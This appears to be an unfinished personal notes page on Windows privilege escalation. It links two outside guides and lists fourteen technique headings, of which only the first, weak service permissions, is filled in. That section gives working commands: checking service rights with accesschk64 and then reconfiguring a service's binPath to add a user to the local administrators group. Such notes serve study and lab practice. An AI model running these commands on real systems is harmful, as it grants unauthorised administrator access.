For Windows Priviledge Escalation guide you can follow these two posts:


1-https://www.fuzzysecurity.com/tutorials/16.html


2-https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/


HERE'S HOW I APPROACH FOR ESCALATING PRIVILEDGES:

![Windows_priv_esc_password_credentials](https://user-images.githubusercontent.com/55708909/92549895-fb567a00-f277-11ea-947d-8929d12b723d.png)


1- Services (binpath):

         First transfer the accesschk64.exe to system 
   
         Run accesschk64.exe -accepteula
   
         Run accesschk64.exe -wvuc "Service name"       accesschk64.exe -wvuc daclsvc
   
   ![Service(BIn_Path)](https://user-images.githubusercontent.com/55708909/92556310-390ecf00-f287-11ea-8a85-1af55670e7aa.png)

          You will see that everyone has read and write permission to change SERVICE_CHANGE_CONFIG
          
          Write this: sc config daclsvc binPath= "net localgroup administrators user /add"
          
          Then write this : sc start daclsvc 
          
          You will be added to admin group 

![Service(BIn_Path_1)](https://user-images.githubusercontent.com/55708909/92556850-8c355180-f288-11ea-982b-b02fd5864ca2.png)


2- Services (Unquoted path):


3- Service (Registry):


4- Services( Executable files):


5- Registry (Always installed elevated):


6- Registry (Modified autorun): Need to have admin login to work


7- Password minig (Registry):


8- Password mining (Memory)


9- Password mining (Configuration Files):


10- Scheduled tasks (Missing binary):


11- Startup applications:


12- Potato attacks:


13- DLL Hijacking:


14-Kernel exploits:

